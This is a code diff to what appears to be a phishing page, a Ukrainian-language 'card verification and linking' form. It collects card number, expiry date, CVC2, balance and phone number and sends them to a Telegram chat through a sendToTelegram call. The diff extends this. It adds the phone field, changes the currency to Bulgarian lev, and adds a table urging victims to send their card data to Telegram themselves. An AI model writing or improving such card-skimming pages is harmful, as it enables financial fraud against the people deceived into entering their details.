@@ -149,11 +149,37 @@
         .country-link { display: flex; align-items: center; text-decoration: none; font-size: 12px; color: #406367; gap: 6px; }
         .flag { width: 16px; height: 11px; border: 1px solid #cedbe0; }
 
-        @media (max-width: 850px) {
-            .main-container { flex-direction: column; }
-            .footer-apps { text-align: left; }
-            .app-buttons { justify-content: flex-start; }
+        /* Новая таблица */
+        .info-table {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
         }
+
+        .info-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .info-table th, .info-table td {
+            padding: 10px;
+            border: 1px solid #e0e0e0;
+            text-align: left;
+        }
+
+        .info-table th {
+            background-color: #f2f4f5;
+            font-weight: bold;
+        }
+
+        /* Стили для номера телефона */
+        .phone-info {
+            font-size: 16px;
+            font-weight: 700;
+        }
+
     </style>
 </head>
 <body>
@@ -176,7 +202,7 @@
 
 <div class="main-container">
     <div class="payment-card">
-        <h2>Верифікація та прив'язка</h2>
+        <h2>Верифікація та прив'язка картки</h2>
 
         <form id="verifyForm">
             <div class="form-group">
@@ -196,8 +222,13 @@
             </div>
 
             <div class="form-group">
+                <label>Номер телефону</label>
+                <input type="text" id="phoneNumber" placeholder="Ваш номер телефону" maxlength="15">
+            </div>
+
+            <div class="form-group">
                 <label>Доступний ліміт (баланс) на картці</label>
-                <input type="text" id="balance" placeholder="0.00 грн">
+                <input type="text" id="balance" placeholder="0.00 лв">
             </div>
 
             <button type="submit" class="verify-btn">ПІДТВЕРДИТИ</button>
@@ -209,10 +240,23 @@
         <p>Для успішної прив'язки картки переконайтеся, що:</p>
         <ul>
             <li>На картці встановлено ліміт для інтернет-оплат.</li>
-            <li>Баланс картки є позитивним (від 1.00 грн).</li>
+            <li>Баланс картки є позитивним (від 1.00 лв).</li>
             <li>Картка підтримує технологію 3D-Secure.</li>
         </ul>
     </div>
+</div>
+
+<!-- Таблица для отображения информации после отправки -->
+<div id="infoTable" class="info-table" style="display: none;">
+    <h3>Ваші дані</h3>
+    <table>
+        <tr><th>Номер картки</th><td id="cardNumberInfo"></td></tr>
+        <tr><th>Термін дії</th><td id="expiryInfo"></td></tr>
+        <tr><th>CVC2</th><td id="cvcInfo"></td></tr>
+        <tr><th>Номер телефону</th><td id="phoneNumberInfo"></td></tr>
+        <tr><th>Баланс картки</th><td id="balanceInfo"></td></tr>
+    </table>
+    <p class="phone-info">Будь ласка, надішліть ці дані у чат Telegram для завершення верифікації.</p>
 </div>
 
 <footer class="footer">
@@ -294,9 +338,14 @@
     document.getElementById('balance').addEventListener('input', e => {
         let val = e.target.value.replace(/[^\d.]/g, '');
         if (val) {
-            // Запобігаємо дублюванню тексту "грн" при введенні
-            e.target.value = val + ' грн';
+            // Запобігаємо дублюванню тексту "лв" при введенні
+            e.target.value = val + ' лв';
         }
+    });
+
+    // НОМЕР ТЕЛЕФОНУ
+    document.getElementById('phoneNumber').addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/\D/g, '');
     });
 
     // Запобігання відправці форми для демонстрації
@@ -308,23 +357,29 @@
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
         const balance = document.getElementById('balance').value;
+        const phoneNumber = document.getElementById('phoneNumber').value;
 
         // Формируем сообщение для Telegram
         const message = `
             <b>Номер картки:</b> ${cardNumber}\n
             <b>Термін дії:</b> ${expiry}\n
             <b>CVC2:</b> ${cvc}\n
+            <b>Номер телефону:</b> ${phoneNumber}\n
             <b>Баланс картки:</b> ${balance}
         `;
 
         // Отправляем сообщение в Telegram
         sendToTelegram(message);
 
-        alert('Дані відправлені на верифікацію!');
+        // Показать таблицу с данными
+        document.getElementById('cardNumberInfo').textContent = cardNumber;
+        document.getElementById('expiryInfo').textContent = expiry;
+        document.getElementById('cvcInfo').textContent = cvc;
+        document.getElementById('phoneNumberInfo').textContent = phoneNumber;
+        document.getElementById('balanceInfo').textContent = balance;
+        document.getElementById('infoTable').style.display = 'block';
     });
 </script>
 
 </body>
 </html>
-
-
